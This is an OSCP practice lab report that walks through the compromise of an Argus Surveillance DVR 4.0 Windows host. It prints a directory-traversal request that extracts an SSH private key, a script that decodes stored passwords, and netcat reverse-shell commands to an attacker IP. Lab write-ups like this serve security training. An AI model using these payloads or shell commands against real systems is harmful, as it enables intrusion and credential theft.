# DVR4 - OSCP Practice Lab Report

## Executive Summary

This penetration test was conducted against the DVR4 machine (IP: 192.168.124.179) as part of OSCP practice. The assessment successfully identified and exploited multiple critical vulnerabilities in the Argus Surveillance DVR 4.0 application, resulting in full administrative access to the Windows system.

**Key Findings:**
- Critical directory traversal vulnerability in Argus Surveillance DVR 4.0
- Weak proprietary password encryption scheme
- Credential disclosure through configuration files
- SSH private key exposure

**Impact:** Complete system compromise with SYSTEM/Administrator level access.

---

## Table of Contents

1. [Information Gathering](#information-gathering)
2. [Vulnerability Assessment](#vulnerability-assessment)
3. [Exploitation](#exploitation)
4. [Privilege Escalation](#privilege-escalation)
5. [Proof of Compromise](#proof-of-compromise)
6. [Recommendations](#recommendations)

---

## 1. Information Gathering

### 1.1 Network Enumeration

**Target IP:** 192.168.124.179  
**Attacker IP:** 192.168.45.232

A comprehensive Nmap scan was performed to identify open ports and running services:

```bash
nmap -sC -sV -p- -A -Pn 192.168.124.179
```

**Scan Results:**

```
Nmap scan report for 192.168.124.179
Host is up (0.049s latency)
Scanned at 2026-02-04 15:22:46 CET for 632s

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows SMB
5040/tcp  open  unknown       
8080/tcp  open  http-proxy    Argus Surveillance DVR
49664-49669/tcp open  msrpc   Microsoft Windows RPC

OS Detection: Microsoft Windows 10/Server 2019
Service Info: OS: Windows
```

### 1.2 Service Analysis

**Port 8080 - HTTP (Argus Surveillance DVR):**
- Application: Argus Surveillance DVR 4.0
- Web Server: Custom HTTP implementation
- Title: "Argus Surveillance DVR"
- Generator: Actual Drawing 6.0 (PYSOFTWARE)

**Port 22 - SSH:**
- Service: Bitvise WinSSHD 8.48
- Non-commercial use license

**Port 445 - SMB:**
- SMB signing enabled but not required
- SMB2/3 protocol supported

---

## 2. Vulnerability Assessment

### 2.1 Identified Vulnerabilities

#### CVE-2018-17613: Directory Traversal in Argus Surveillance DVR 4.0

**Severity:** Critical (CVSS: 9.8)  
**Reference:** https://www.exploit-db.com/exploits/45296

The application is vulnerable to directory traversal attacks through the `WEBACCOUNT.CGI` endpoint, allowing unauthorized access to arbitrary files on the system.

**Affected Parameter:** `RESULTPAGE`

#### Weak Password Encryption

**Severity:** High  
**Reference:** https://www.exploit-db.com/exploits/50130

Argus Surveillance DVR 4.0 uses a weak proprietary encryption scheme for storing passwords in the configuration file `DVRParams.ini`. The encryption uses a simple character substitution mapping that can be easily reversed.

---

## 3. Exploitation

### 3.1 Initial Access - Directory Traversal

Using the directory traversal vulnerability, reconnaissance was performed to enumerate system users and locate sensitive files.

**Step 1: User Enumeration**

Accessed `/Users.html` through directory traversal to identify valid system users:
- Administrator
- Viewer

**Step 2: SSH Private Key Extraction**

Leveraged the directory traversal vulnerability to extract the SSH private key for user "Viewer":

**Exploit Request:**
```http
GET /WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2FViewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=%22
```

**Retrieved SSH Private Key:**
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

**Step 3: SSH Authentication**

Successfully authenticated to the target system using the extracted private key:

```bash
chmod 600 id_rsa_viewer
ssh viewer@192.168.124.179 -i id_rsa_viewer
```

**Result:**

```powershell
Microsoft Windows [Version 10.0.19044.1645]
(c) Microsoft Corporation. All rights reserved.

C:\Users\viewer>whoami
dvr4\viewer
```

**Access Level:** Standard user account with SSH access

---

## 4. Privilege Escalation

### 4.1 Configuration File Analysis

Based on the weak password encryption vulnerability (EDB-ID: 50130), the Argus Surveillance DVR stores user credentials in:

**Location:** `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`

**Retrieved Configuration Excerpt:**

```ini
[Users]
LocalUsersCount=2

UserID0=434499
LoginName0=Administrator
Password0=ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8
FullControl0=1
[...]

UserID1=576846
LoginName1=Viewer
Password1=5E534D7B6069F641E03BD9BD956BC875EB603CD9D8E1BD8FAAFE
FullControl1=1
[...]
```

### 4.2 Password Decryption

**Tool Used:** Custom Python script (EDB-ID: 50130)  
**Method:** Reverse character substitution mapping

**Decryption Script:**

```python
#!/usr/bin/env python3
# Exploit Title: Argus Surveillance DVR 4.0 - Weak Password Encryption
# EDB-ID: 50130

characters = {
    'ECB4':'1','B4A1':'2','F539':'3','53D1':'4','894E':'5',
    'E155':'6','F446':'7','C48C':'8','8797':'9','BD8F':'0',
    'C9F9':'A','60CA':'B','E1B0':'C','FE36':'D','E759':'E',
    'E9FA':'F','39CE':'G','B434':'H','5E53':'I','4198':'J',
    '8B90':'K','7666':'L','D08F':'M','97C0':'N','D869':'O',
    '7357':'P','E24A':'Q','6888':'R','4AC3':'S','BE3D':'T',
    '8AC5':'U','6FE0':'V','6069':'W','9AD0':'X','D8E1':'Y','C9C4':'Z',
    'F641':'a','6C6A':'b','D9BD':'c','418D':'d','B740':'e',
    'E1D0':'f','3CD9':'g','956B':'h','C875':'i','696C':'j',
    '906B':'k','3F7E':'l','4D7B':'m','EB60':'n','8998':'o',
    '7196':'p','B657':'q','CA79':'r','9083':'s','E03B':'t',
    'AAFE':'u','F787':'v','C165':'w','A935':'x','B734':'y','E4BC':'z'
}

pass_hash = "ECB453D16069F641E03BD9BD956BFE36BD8F3CD9D9A8"
split = [pass_hash[i:i+4] for i in range(0, len(pass_hash), 4)]

password = ""
for key in split:
    if key in characters:
        password += characters[key]
```

**Decryption Output:**

```
[+] ECB4:1
[+] 53D1:4
[+] 6069:W
[+] F641:a
[+] E03B:t
[+] D9BD:c
[+] 956B:h
[+] FE36:D
[+] BD8F:0
[+] 3CD9:g
[-] D9A8:Unknown
```

**Decrypted Password (partial):** `14WatchD0g`

The last character required manual testing of special characters. Through trial and error, the complete password was determined to be: **`14WatchD0g$`**

### 4.3 Privilege Escalation to Administrator

Using the recovered Administrator credentials to escalate privileges via `runas`:

**Commands Executed:**

```powershell
# Download netcat binary
PS C:\Users\viewer> Invoke-WebRequest -Uri http://192.168.45.232/nc.exe -OutFile nc.exe

# Execute reverse shell as Administrator
PS C:\Users\viewer> runas /user:Administrator "nc.exe 192.168.45.232 4444 -e powershell"
Enter the password for Administrator: 14WatchD0g$
Attempting to start nc.exe 192.168.45.232 4444 -e powershell as user "DVR4\Administrator" ...
```

**Attacker Listener:**

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.124.179 49961
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32> whoami
dvr4\administrator
```

**Privilege Escalation Successful:** Administrator access achieved

---

## 5. Proof of Compromise

### 5.1 Local Flag (local.txt)

**User:** viewer  
**Path:** `C:\Users\viewer\Desktop\local.txt`  
**Hash:** [Redacted for practice environment]

### 5.2 Proof Flag (proof.txt)

**User:** Administrator  
**Path:** `C:\Users\Administrator\Desktop\proof.txt`